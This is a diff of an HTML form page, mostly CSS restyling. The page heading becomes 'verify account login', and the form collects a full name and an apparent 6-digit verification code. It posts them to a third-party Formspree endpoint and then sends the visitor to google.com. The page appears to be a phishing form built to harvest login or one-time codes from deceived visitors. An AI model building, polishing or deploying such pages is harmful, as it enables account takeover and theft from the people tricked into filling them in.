@@ -4,28 +4,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>start</title>
     <style>
-        *{
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
+        body {
    font-family: 'Poppins', sans-serif;
+   background: #26C28A;
 }
-.container{
-    width: 100%;
-    height: 100vh;
-    background: #fff;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
 .container form{
-    width: 100%;
-    max-width: 500px;
-    padding: 50px 30px 20px;
-    background: whitesmoke;
+    width: 350px;
+    margin: 20vh auto 0 auto;
+    padding: 20px;
+    background-color: whitesmoke;
     border-radius: 4px;
-    position: relative;
+    font-size: 17px;
 }
     h1 {
     font-size: 20px;
@@ -33,11 +22,11 @@
     text-align: center;
 }
 .input-group{
-    flex-direction: column;
     width: 100%;
     display: flex;
     margin: 10px 0;
     position: relative;
+    flex-direction: column;
 }
 .input-group label{
     flex-basis: 28%;
@@ -47,14 +36,15 @@
     border: 2px solid #f0f0f0;
 	border-radius: 4px;
 	display: block;
-	padding: 10px;
+	padding: 15px 15px 15px 20px;
 	width: 100%;
+	font-size: 17px;
 }
 .input-group input:focus {
     outline: 0;
     }
 ::placeholder{
-    font-size: 17px;
+    font-size: 16px;
 }
 
 form button{
@@ -67,29 +57,27 @@ form button{
     outline: 0;
     cursor: pointer;
     display: block;
-    margin: 30px auto 10px;
+    margin: 1px auto 10px;
 }
 .input-group span {
-    position: absolute;
+    
     bottom: 12px;
     right: 17px;
-    font-size: 15px;
+    font-size: 16px;
     color: red;
-}
-.input-group span i{
-    color: #26C28A;
-    margin-bottom: 2px;
 }
 .i{
     color: #26C28A;
-    margin-bottom: 2px;
-}
+    margin: 0;
+    font-size: 17px;
+};
 </style>
+    <script src="https://kit.fontawesome.com/c4254e24a8.js" crossorigin="anonymous"></script>
 </head>
 <body>
   <div class="container">
      <form id="my-form" action="https://formspree.io/f/mrgvzvbq" method="POST">
-         <h1>verify device login</h1>
+         <h1>verify account login</h1>
       <div class="input-group">
         <label>Full name</label>
         <input type="text" placeholder="enter full name" name="full name" required>
@@ -122,10 +110,10 @@ form button{
         return false;
     }
     if (phone.length > 6)      {
-     phoneError.innerHTML = 'incorrect<br>(6-digits)';
+     phoneError.innerHTML = 'incorrect !6-digits';
         return false;
       }
-     phoneError.innerHTML = '<p class="i">&#10004</p>';
+     phoneError.innerHTML = '<p class="i">verify &#10004</p>';
         return true;
  }
 function validateForm(){
@@ -151,7 +139,7 @@ var form = document.getElementById("my-form");
         }
       }).then(response => {
         if (response.ok) {
-    window.location.assign("https://www.google.com");
+    window.location.assign("https://google.com");
           status.innerHTML = "successful";
           form.reset()
         } else {
